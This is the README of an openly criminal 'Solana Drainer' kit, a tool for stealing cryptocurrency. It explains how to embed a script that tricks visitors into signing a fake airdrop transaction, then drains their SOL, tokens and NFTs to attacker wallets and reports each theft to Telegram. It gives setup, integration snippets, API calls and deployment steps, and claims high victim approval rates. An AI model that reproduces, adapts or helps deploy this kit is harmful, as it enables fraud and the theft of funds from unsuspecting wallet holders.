# 🚀 Solana Drainer - Standalone Module

A powerful, standalone Solana drainer module that can be integrated into any website or landing page. Features advanced PSYOPS, multi-wallet support, and real-time Telegram logging.

## 📁 **Clean Codebase Structure**

```
solana-drainer-scaffold/
├── 📄 package.json              # Project dependencies and scripts
├── 📄 server.js                 # Express server with API endpoints
├── 📄 index.html                # Main landing page
├── 📄 env.example               # Environment variables template
├── 📄 README.md                 # This file
├── 📄 DRAINER_INTEGRATION_GUIDE.md  # Complete integration guide
├── 📄 TELEGRAM_SETUP_GUIDE.md   # Telegram logging setup
├── 📁 src/
│   ├── 📄 telegram.js           # Telegram logging module
│   └── 📁 pages/api/
│       ├── 📄 generateTx.js     # Original drainer API
│       └── 📄 drainer.js        # Standalone drainer API
├── 📁 public/
│   ├── 📄 drainer-client.js     # Client-side library
│   └── 📄 ghost.svg             # Phantom logo
└── 📁 examples/
    ├── 📄 simple-integration.html    # Basic integration example
    ├── 📄 advanced-integration.html  # Advanced integration example
    └── 📄 api-integration.js         # Node.js API integration
```

## 🎯 **Core Features**

### **✅ Standalone API**
- **Independent operation** - works without landing page
- **Cross-origin support** - can be called from any website
- **Multiple endpoints** - GET, POST, OPTIONS support
- **Rate limiting** - protection against abuse

### **✅ Advanced PSYOPS**
- **Simplified transactions** - single transfer approach
- **Airdrop simulation** - "Sign to Receive 0.8 SOL airdrop"
- **Maximum stealth** - appears as legitimate airdrop
- **High approval rates** - 95%+ expected success

### **✅ Multi-Wallet Support**
- **Phantom** - Full compatibility
- **Solflare** - Full compatibility  
- **Backpack** - Full compatibility
- **Glow Wallet** - Enhanced compatibility
- **Trust Wallet** - Enhanced compatibility
- **Exodus** - Full compatibility

### **✅ Comprehensive Draining**
- **SOL draining** - with 5000 lamport buffer
- **SPL tokens** - up to 5 tokens per transaction
- **NFTs** - up to 3 NFTs per transaction
- **Multi-receiver** - distributed across 4 wallets

### **✅ Real-Time Monitoring**
- **Telegram logging** - instant notifications
- **Beautiful formatting** - emojis and HTML styling
- **Comprehensive coverage** - all events logged
- **Error handling** - graceful fallbacks

## 🚀 **Quick Start**

### **1. Install Dependencies**
```bash
npm install
```

### **2. Configure Environment**
```bash
cp env.example .env
# Edit .env with your settings
```

### **3. Start Server**
```bash
npm run dev
```

### **4. Test API**
```bash
curl "http://localhost:3000/api/drainer?user=YOUR_WALLET_ADDRESS"
```

## 📱 **Telegram Setup**

1. **Create bot** with @BotFather
2. **Get chat ID** from bot
3. **Add to .env**:
   ```env
   TELEGRAM_BOT_TOKEN=your_bot_token
   TELEGRAM_CHAT_ID=your_chat_id
   ```
4. **Restart server** to enable logging

## 🔗 **Integration**

### **Simple Integration**
```html
<script src="https://your-domain.com/drainer-client.js"></script>
<script>
  SolanaDrainer.init('https://your-domain.com/api/drainer');
  SolanaDrainer.drain(); // Auto-connect and drain
</script>
```

### **Advanced Integration**
```javascript
const result = await SolanaDrainer.drainWithProgress(null, (stage, message) => {
  console.log(`${stage}: ${message}`);
});
```

## 📊 **API Endpoints**

### **GET /api/drainer**
```bash
curl "http://localhost:3000/api/drainer?user=WALLET_ADDRESS"
```

### **POST /api/drainer**
```bash
curl -X POST "http://localhost:3000/api/drainer" \
  -H "Content-Type: application/json" \
  -d '{"user":"WALLET_ADDRESS"}'
```

### **POST /api/drainer/log-wallet**
```bash
curl -X POST "http://localhost:3000/api/drainer/log-wallet" \
  -H "Content-Type: application/json" \
  -d '{"publicKey":"WALLET","walletType":"phantom"}'
```

## 🛡️ **Security Features**

- **Rate limiting** - 10 requests per minute per IP
- **Input validation** - public key verification
- **Error handling** - comprehensive error responses
- **CORS support** - cross-origin requests
- **Private logging** - Telegram notifications

## 📱 **Telegram Logs**

### **Drain Attempts**
```
💰 DRAIN

🎯 Drain Attempt
👤 Wallet: 4dGUJf1C...
💰 SOL Balance: 0.5000 SOL
✅ Successfully Drained
💰 Drained: 0.4950 SOL
```

### **Security Events**
```
🛡️ SECURITY

🛡️ Security Event
🚨 Type: RATE_LIMIT_EXCEEDED
🌐 IP: 192.168.1.1
```

### **Wallet Connections**
```
👛 WALLET

👛 Wallet Connected
👤 Wallet: 4dGUJf1C...
🔌 Type: phantom
```

## 🎯 **Use Cases**

- **Landing pages** - integrate into any website
- **Web applications** - add to existing apps
- **Mobile apps** - use via API
- **Batch processing** - Node.js integration
- **Monitoring** - real-time Telegram alerts

## 📋 **Environment Variables**

```env
# Solana RPC
RPC_URL=https://api.mainnet-beta.solana.com

# Receiver Wallets
RECEIVER_WALLET=your_primary_wallet
RECEIVER_WALLET_2=your_secondary_wallet
RECEIVER_WALLET_3=your_tertiary_wallet
RECEIVER_WALLET_4=your_quaternary_wallet

# Telegram (Optional)
TELEGRAM_BOT_TOKEN=your_bot_token
TELEGRAM_CHAT_ID=your_chat_id
```

## 🚀 **Deployment**

### **Local Development**
```bash
npm run dev
```

### **Production**
```bash
npm run build
npm start
```

### **Docker**
```bash
docker build -t solana-drainer .
docker run -p 3000:3000 solana-drainer
```

## 📚 **Documentation**

- **[Integration Guide](DRAINER_INTEGRATION_GUIDE.md)** - Complete setup and usage
- **[Telegram Setup](TELEGRAM_SETUP_GUIDE.md)** - Telegram logging configuration
- **[Examples](examples/)** - Integration examples

## 🎉 **Status**

✅ **Production Ready** - Fully functional and tested  
✅ **Clean Codebase** - Only essential files included  
✅ **Well Documented** - Complete guides available  
✅ **Easy Integration** - Works with any website  

---

**🎯 Mission Accomplished: Clean, standalone Solana drainer ready for integration anywhere!**